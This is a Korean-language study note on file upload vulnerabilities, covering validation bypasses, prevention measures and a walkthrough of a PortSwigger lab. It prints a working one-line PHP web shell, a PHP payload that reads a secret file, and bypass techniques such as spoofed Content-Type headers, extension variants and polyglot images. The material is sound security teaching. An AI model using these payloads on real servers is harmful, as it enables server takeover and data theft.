# File Upload Vulnerabilities

## 개념

파일 업로드 기능에서 서버가 업로드된 파일의 타입/내용을 제대로 검증하지 않을 때 발생.
공격자가 악성 파일(웹쉘 등)을 업로드해서 서버에서 임의의 코드를 실행할 수 있음.

OWASP Top 10 2021 기준 **A08 — Software and Data Integrity Failures** 와 연관.

---

## 공격 시나리오

```
1. 공격자가 webshell.php 업로드
2. 서버가 /uploads/webshell.php 에 파일 저장
3. 공격자가 http://victim.com/uploads/webshell.php?cmd=whoami 요청
4. 서버에서 PHP 코드가 실행됨 → 서버 장악
```

### 웹쉘 예시 (PHP)
```php
<?php echo system($_GET['cmd']); ?>
```
이 한 줄짜리 파일이 업로드되면 URL 파라미터로 서버 명령어를 실행할 수 있음.

---

## 취약한 검증 방식과 우회법

### 1) Content-Type 헤더만 검사
```
서버: Content-Type이 image/jpeg 이면 허용
공격: Burp Suite로 Content-Type 헤더를 image/jpeg 로 조작
→ 실제 내용은 PHP 코드여도 통과
```

### 2) 파일 확장자 블랙리스트
```
서버: .php 확장자 차단
공격: .php5, .phtml, .pHp, .Php 등 변형 사용
→ 서버 설정에 따라 이런 확장자도 PHP로 실행될 수 있음
```

### 3) 파일 확장자 화이트리스트 + 내용 무검사
```
서버: .jpg, .png 만 허용
공격: 파일명을 webshell.jpg 로 하고 내용은 PHP 코드 삽입
→ 파일 내용(MIME type)을 별도로 검사하지 않으면 통과
```

### 4) 경로 조작 (Path Traversal)
```
파일명에 ../../ 삽입
→ 업로드 디렉토리를 벗어나 원하는 위치에 저장
```

### 5) Race Condition
```
서버 처리 흐름: 파일 임시 저장 → 검증 → 삭제
공격: 임시 저장된 직후, 검증/삭제 전에 해당 경로로 접근
→ 잠깐이지만 악성 파일이 실행 가능한 상태
```

### 6) Polyglot 파일
```
ExifTool 같은 도구로 유효한 JPEG 형식을 유지하면서
이미지 메타데이터 안에 PHP 코드를 삽입
→ 이미지 검증(magic bytes 확인)을 통과하면서도 PHP로 실행 가능
```

---

## 취약점이 없어도 위험한 경우

| 상황 | 위험 |
|------|------|
| SVG 파일 허용 | SVG 안에 JavaScript 삽입 → Stored XSS |
| HTML 파일 허용 | HTML 안에 스크립트 삽입 → XSS |
| XML 파일 허용 | XXE(XML External Entity) 공격 가능 |
| 압축 파일 허용 | Zip Bomb으로 서버 자원 소진 |

---

## 예방법

| 항목 | 조치 |
|------|------|
| 파일명 | 업로드된 파일명 그대로 저장 금지 → 랜덤 UUID로 변경 |
| 확장자 | 화이트리스트 방식 (허용 목록만 통과) |
| 파일 내용 | MIME type 실제 내용 검사 (magic bytes 확인) |
| 저장 위치 | 웹 루트 밖에 저장 or 실행 권한 없는 디렉토리 |
| 이미지 | 업로드 후 이미지 라이브러리로 재가공 (메타데이터 제거) |
| CDN | 파일 서빙은 별도 도메인에서 (same-origin 격리) |

---

## PortSwigger Lab — Remote code execution via web shell upload

**링크**: `portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload`

### 목표
PHP 웹쉘을 업로드해서 서버의 `/home/carlos/secret` 파일 내용 읽기

### 사용 도구
- **Burp Suite Proxy**: 업로드 요청 가로채기
- **Burp Suite Repeater**: 요청 내용 수동 수정 후 전송

> ⚠️ webshell.php를 로컬에 저장하면 Windows Defender가 탐지함
> Burp Repeater에서 직접 수정하는 방식으로 로컬 파일 생성 없이 진행

### 풀이 순서

**1단계 — 로그인**
- `wiener` / `peter` 로 로그인

**2단계 — 이미지 업로드 요청 캡처**
1. **Intercept is on** 상태로 전환
2. 프로필 페이지에서 아무 이미지(.jpg/.png) 업로드
3. Burp에 요청이 잡힘 — 아래 구조로 되어 있음:
   ```
   POST /my-account/avatar HTTP/2
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

   ------WebKitFormBoundary...
   Content-Disposition: form-data; name="avatar"; filename="사진.png"
   Content-Type: image/png

   PNG...（이미지 바이너리 데이터）
   ```

**3단계 — Repeater에서 요청 수정**
1. 요청에서 우클릭 → **Send to Repeater**
2. **Forward** 눌러서 원래 요청 보내기
3. Repeater 탭으로 이동 후 세 곳 수정:
   - `filename="사진.png"` → `filename="webshell.php"`
   - `Content-Type: image/png` → `Content-Type: application/octet-stream`
   - 이미지 바이너리 데이터 전체 삭제 후 아래 코드로 교체:
     ```
     <?php echo file_get_contents('/home/carlos/secret'); ?>
     ```
4. **Send** 클릭
5. 응답에 `The file avatars/webshell.php has been uploaded.` 확인

**4단계 — 웹쉘 실행**
1. Burp 브라우저에서 아래 URL 접속:
   ```
   https://[랩ID].web-security-academy.net/files/avatars/webshell.php
   ```
2. 페이지에 secret 값 출력됨

**5단계 — 정답 제출**
- 랩 페이지에서 **Submit solution** → secret 값 입력 → 클리어

### 핵심 포인트
- 서버가 확장자, 내용, Content-Type 아무것도 검증하지 않음 → PHP 파일 그대로 업로드
- PHP 파일은 서버에서 코드로 실행됨 → 서버 파일 읽기 가능
- Repeater = 요청을 직접 수정해서 수동으로 테스트하는 기능
- Content-Type 헤더는 브라우저가 보내는 값 → Burp로 마음대로 조작 가능
